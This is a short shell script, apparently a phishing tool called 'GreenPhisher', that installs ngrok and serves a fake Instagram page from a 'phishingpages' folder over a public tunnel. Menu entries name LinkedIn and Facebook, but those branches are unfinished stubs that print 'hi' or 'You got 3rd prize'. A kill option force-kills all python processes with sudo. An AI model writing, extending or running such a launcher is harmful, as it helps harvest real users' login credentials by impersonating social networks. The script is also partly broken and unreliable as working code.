#!/bin/sh
RED='\033[0;31m'
NC='\033[0m' # No Color
GREEN='\033[0;32m'        # Green
UGREEN='\033[4;32m'       # Green

clear
echo "${GREEN}░██████╗░██████╗░███████╗███████╗███╗░░██╗██████╗░██╗░░██╗██╗░██████╗██╗░░██╗███████╗██████╗░${NC} "
echo "${GREEN}██╔════╝░██╔══██╗██╔════╝██╔════╝████╗░██║██╔══██╗██║░░██║██║██╔════╝██║░░██║██╔════╝██╔══██╗${NC} "
echo "${GREEN}██║░░██╗░██████╔╝█████╗░░█████╗░░██╔██╗██║██████╔╝███████║██║╚█████╗░███████║█████╗░░██████╔╝${NC} "
echo "${GREEN}██║░░╚██╗██╔══██╗██╔══╝░░██╔══╝░░██║╚████║██╔═══╝░██╔══██║██║░╚═══██╗██╔══██║██╔══╝░░██╔══██╗${NC} "
echo "${GREEN}╚██████╔╝██║░░██║███████╗███████╗██║░╚███║██║░░░░░██║░░██║██║██████╔╝██║░░██║███████╗██║░░██║${NC} "
echo "${GREEN}░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚══╝╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝${NC} "

echo "\n"                                                                                         
echo "\t\t\t\t\t\t\t\t\t\t ~ Madhav Shah"
echo 
echo 
echo "${RED}INSTALLING DEPENDENTIES ${NC}"

if [ -f ngrok ]
then

echo 
echo 
else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
sudo apt install unzip
sudo apt-get install python3.6
clear
fi



echo "Enter your choice"
echo "1) Instagram"
echo "2) Linkedin"
echo "3) Facebook"
echo "4) Kill all webservers and ngrok"

echo 
echo 
echo "Enter your choice: "
read n

if [ $n -eq 1 ];
then
cd phishingpages
cd instagram

ngrok http --bind-tls=true --log=stdout 8080 > /dev/null &
sleep 2
curl http://localhost:4040/api/tunnels
python3 -m http.server 8080 & 






elif [ $n -eq 2 ];
then


echo "hi"

elif [ $n -eq 3 ];
then
echo "You got 3rd prize"

elif [ $n -eq 4 ];
then
killall ngrok 
sudo pkill -9 python




else
echo "Sorry, please enter valid choice"
fi



